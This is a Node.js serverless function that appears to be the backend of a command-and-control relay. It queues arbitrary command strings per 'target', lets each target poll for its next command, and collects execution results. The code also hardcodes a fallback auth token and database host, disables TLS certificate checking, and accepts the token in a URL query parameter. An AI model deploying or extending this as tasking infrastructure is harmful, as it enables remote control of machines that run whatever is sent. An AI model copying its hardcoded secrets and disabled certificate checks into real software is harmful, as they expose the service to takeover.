// api/control.js (Serverless Vercel Function)
// Uses env vars: DATABASE_URL and AUTH_TOKEN

const { Client } = require('pg');

const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://postgres:[YOUR_PASSWORD]@db.uctckjijhflehspmmtts.supabase.co:5432/postgres';
const AUTH_TOKEN = process.env.AUTH_TOKEN || 'ChoraX_2025_UltraSecure_77'; // default fallback (avoid #)

async function withClient(fn) {
  const client = new Client({
    connectionString: DATABASE_URL,
    ssl: { rejectUnauthorized: false }
  });
  await client.connect();
  try { await fn(client); } finally { await client.end(); }
}

async function ensureTable() {
  if (!DATABASE_URL) return;
  await withClient(async (c) => {
    await c.query(`
      CREATE TABLE IF NOT EXISTS jobs (
        id SERIAL PRIMARY KEY,
        target VARCHAR(255),
        cmd TEXT,
        status VARCHAR(50) DEFAULT 'queued',
        result TEXT,
        created_at TIMESTAMP DEFAULT NOW()
      );
    `);
  });
}

module.exports = async (req, res) => {
  res.setHeader('Content-Type', 'application/json');

  // Accept token via header or query param 't'
  const token = (req.headers['x-api-token'] || req.query?.t || '').toString();
  if (token !== AUTH_TOKEN) {
    return res.status(403).end(JSON.stringify({ error: 'forbidden' }));
  }

  if (!DATABASE_URL) {
    return res.status(500).end(JSON.stringify({ error: 'missing_database_url' }));
  }

  await ensureTable();

  try {
    const url = req.url || '';
    const method = (req.method || 'GET').toUpperCase();

    // Helper to read body (raw)
    const readBody = async () => {
      if (req.body) return req.body;
      return await new Promise((resolve) => {
        let d = '';
        req.on('data', (c) => (d += c));
        req.on('end', () => {
          try { resolve(JSON.parse(d || '{}')); } catch (e) { resolve({}); }
        });
      });
    };

    // Submit job
    if (url.includes('/job/submit') && method === 'POST') {
      const body = await readBody();
      const target = body.target || 'default';
      const cmd = body.cmd || '';

      await withClient(async (c) => {
        const r = await c.query('INSERT INTO jobs (target, cmd) VALUES ($1, $2) RETURNING id', [target, cmd]);
        return res.status(200).end(JSON.stringify({ id: r.rows[0].id }));
      });
      return;
    }

    // Poll job
    if (url.includes('/job/poll') && method === 'GET') {
      const target = (req.query && req.query.target) || 'default';
      await withClient(async (c) => {
        await c.query('BEGIN');
        const sel = await c.query("SELECT * FROM jobs WHERE target=$1 AND status='queued' ORDER BY id LIMIT 1 FOR UPDATE SKIP LOCKED", [target]);
        if (sel.rows.length === 0) {
          await c.query('COMMIT');
          return res.status(200).end(JSON.stringify({ job: null }));
        }
        const job = sel.rows[0];
        await c.query("UPDATE jobs SET status='in-progress' WHERE id=$1", [job.id]);
        await c.query('COMMIT');
        return res.status(200).end(JSON.stringify({ job }));
      });
      return;
    }

    // Submit result
    if (url.includes('/job/result') && method === 'POST') {
      const body = await readBody();
      const id = parseInt(body.id) || 0;
      const status = body.status || 'done';
      const resultText = (body.result || '').toString().slice(0, 2000);

      await withClient(async (c) => {
        await c.query('UPDATE jobs SET status=$1, result=$2 WHERE id=$3', [status, resultText, id]);
        return res.status(200).end(JSON.stringify({ ok: true }));
      });
      return;
    }

    // default
    return res.status(200).end(JSON.stringify({ ok: true }));
  } catch (err) {
    console.error(err);
    return res.status(500).end(JSON.stringify({ error: 'server_error', detail: String(err) }));
  }
};
